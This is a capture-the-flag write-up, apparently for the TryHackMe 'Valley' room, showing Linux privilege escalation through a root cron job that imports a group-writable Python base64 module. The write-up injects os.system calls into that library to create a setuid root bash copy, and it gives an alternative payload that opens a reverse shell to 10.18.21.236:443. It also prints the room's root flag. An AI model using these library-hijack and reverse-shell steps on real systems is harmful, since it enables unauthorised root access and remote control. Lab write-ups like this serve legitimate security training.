

```sh
valley@valley:/$ id
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)

valley@valley:/$ find / -type f -group valleyAdmin 2>/dev/null
/usr/lib/python3.8/base64.py
```

/etc/crontab
```sh
valley@valley:/usr/lib/python3.8$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py

#
```

/photos/script/photosEncrypt.py
```sh
valley@valley:/usr/lib/python3.8$ cat /photos/script/photosEncrypt.py 
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)
```

added to /usr/lib/python3.8/base64.py
```python
import os

os.system("touch /tmp/testfile2")
os.system("cp /bin/bash /tmp/sofia")
os.system("chmod +xs /tmp/sofia")
```

```sh
valley@valley:/usr/lib/python3.8$ nano base64.py
valley@valley:/usr/lib/python3.8$ cd /tmp
valley@valley:/tmp$ ls -la
total 1212
drwxrwxrwt 14 root root    4096 May 20 01:24 .
drwxr-xr-x 21 root root    4096 Mar  6  2023 ..
drwxrwxrwt  2 root root    4096 May 19 23:17 .font-unix
drwxrwxrwt  2 root root    4096 May 19 23:17 .ICE-unix
drwx------  2 root root    4096 May 19 23:17 snap-private-tmp
-rwsr-sr-x  1 root root 1183448 May 20 01:24 sofia
drwx------  3 root root    4096 May 19 23:17 systemd-private-5c23c12db00549c5a00872774363a8d1-apache2.service-62mazi
drwx------  3 root root    4096 May 19 23:17 systemd-private-5c23c12db00549c5a00872774363a8d1-ModemManager.service-G3xVji
drwx------  3 root root    4096 May 19 23:17 systemd-private-5c23c12db00549c5a00872774363a8d1-systemd-logind.service-GCGzyi
drwx------  3 root root    4096 May 19 23:17 systemd-private-5c23c12db00549c5a00872774363a8d1-systemd-resolved.service-vTNLoh
drwx------  3 root root    4096 May 19 23:17 systemd-private-5c23c12db00549c5a00872774363a8d1-systemd-timesyncd.service-pPUUti
-rw-r--r--  1 root root       0 May 20 01:19 testfile
-rw-r--r--  1 root root       0 May 20 01:23 testfile1
-rw-r--r--  1 root root       0 May 20 01:24 testfile2
drwxrwxrwt  2 root root    4096 May 19 23:17 .Test-unix
drwxrwxrwt  2 root root    4096 May 19 23:17 VMwareDnD
drwxrwxrwt  2 root root    4096 May 19 23:17 .X11-unix
drwxrwxrwt  2 root root    4096 May 19 23:17 .XIM-unix
valley@valley:/tmp$ ./sofia -p
sofia-5.0# whoami
root
sofia-5.0# cd /root
sofia-5.0# cat root.txt
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
sofia-5.0# exit
exit
valley@valley:/tmp$
```

alternative solution:
```python
import os

os.system("touch /tmp/testfile9")
os.system("echo 'bash -i >& /dev/tcp/10.18.21.236/443 0>&1'|bash")
```
observe: os.system("bash -i >& /dev/tcp/10.18.21.236/443 0>&1") may not work but the above does, funny

also, sh script.sh doesn't work but bash script.sh does. I'm assuming os.system and sh (linked to dash) can't handle the redirections


